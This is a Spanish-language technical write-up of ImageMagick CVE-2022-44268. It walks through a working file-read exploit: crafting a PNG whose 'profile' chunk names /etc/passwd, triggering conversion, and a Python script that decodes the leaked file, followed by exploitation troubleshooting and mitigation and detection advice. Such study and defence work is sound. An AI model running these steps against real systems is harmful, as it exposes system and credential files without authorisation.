---
title: ImageMagick CVE-2022-44268 — lectura arbitraria de ficheros
tags: [linux, web, imagemagick, png, cve-2022-44268, file-read]
---

# CVE-2022-44268: ImageMagick lee lo que le pidas

[🇬🇧 English](imagemagick-file-read.en.md) | **Español**

## 1. El fallo

En `coders/png.c`, `ReadOnePNGImage` procesa los chunks de texto (`tEXt`/`zTXt`) del PNG. Si la clave es literalmente `profile`, el valor se interpreta como **nombre de fichero** y su contenido se carga como perfil raw. Al reescribir la imagen, ese perfil viaja dentro del PNG de salida.

Afecta a ImageMagick **7.1.0-49** (y anteriores cercanas); corregido en 7.1.0-50 con la comprobación `LocaleCompare(key,"profile") == 0` en el commit `05673e6`. CVSS 3.1: 6.5–7.5, CWE-200.

## 2. Construir el PNG

Con `pngcrush`, se añade el chunk a una imagen cualquiera:

```bash
pngcrush -text a 'profile' '/etc/passwd' input.png output.png
```

Equivalente en Python con `pypng` o `PIL` + `PngInfo`: el chunk debe ser `tEXt` con keyword `profile` y el texto igual a la ruta absoluta. La ruta puede ser relativa si el proceso se ejecuta en el directorio adecuado.

## 3. Disparar la conversión

Cualquier operación que **reescriba** la imagen sirve: redimensionar, convertir formato, generar miniatura.

```bash
convert output.png -resize 50% leak.png
magick output.png -resize 50% leak.png
```

Si la aplicación web hace la conversión, basta con subir `output.png` y descargar el resultado.

## 4. Extraer el contenido

```bash
identify -verbose leak.png | sed -n '/Raw profile type/,/^$/p'
```

La salida incluye una longitud y el contenido en **hexadecimal**:

```text
Raw profile type:

    2367
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a...
```

```bash
python3 - <<'PY'
import re, subprocess
out = subprocess.check_output(["identify", "-verbose", "leak.png"]).decode()
hexdump = re.search(r"Raw profile type[^\n]*\n\n\s*\d+\n([0-9a-fA-F\n]+)", out).group(1)
print(bytes.fromhex(hexdump.replace("\n", "")).decode(errors="replace"))
PY
```

## 5. Por qué funciona y cuándo no

- El proceso (`convert`, `magick` o el servicio web) lee el fichero con **sus** permisos: si corre como `www-data`, no verás `/etc/shadow`.
- El perfil se escribe en el PNG de salida, no en la respuesta HTTP: si la app devuelve la imagen transformada, tienes el canal.
- Si la app devuelve solo un thumbnail o recomprime sin perfiles, el contenido se pierde; prueba a pedir la imagen original transformada.
- Con `policy.xml` restrictivo (`<policy domain="path" rights="none" pattern="/etc/*"/>`) el fallo no se explota.

## 6. Errores típicos

- **`identify` no muestra el perfil** → la conversión no reescribió la imagen o se usó `-strip`.
- **El hex está truncado** → el perfil tiene un tamaño máximo; lee ficheros pequeños o por partes.
- **`no decode delegate for this image format`** → el PNG generado está corrupto; valida con `pngcheck`.
- **`improper image header`** → el chunk se insertó con `zTXt` y compresión inválida; usa `tEXt`.

## 7. Detección y mitigación

- Actualizar ImageMagick a 7.1.0-50 o superior; en distros, aplicar el parche del vendor (DSA-5347, USN, SUSE).
- `policy.xml` con `domain="path" rights="none"` para rutas sensibles y `domain="coder"` para codificadores no usados.
- Deshabilitar perfiles en el pipeline (`-strip`, `-define png:exclude-chunks=all`) cuando no se necesiten.
- Detección: PNG subidos con `tEXt` cuyo keyword sea `profile`, o cuyo valor parezca una ruta absoluta.

MITRE: T1005, T1190, T1552.001.
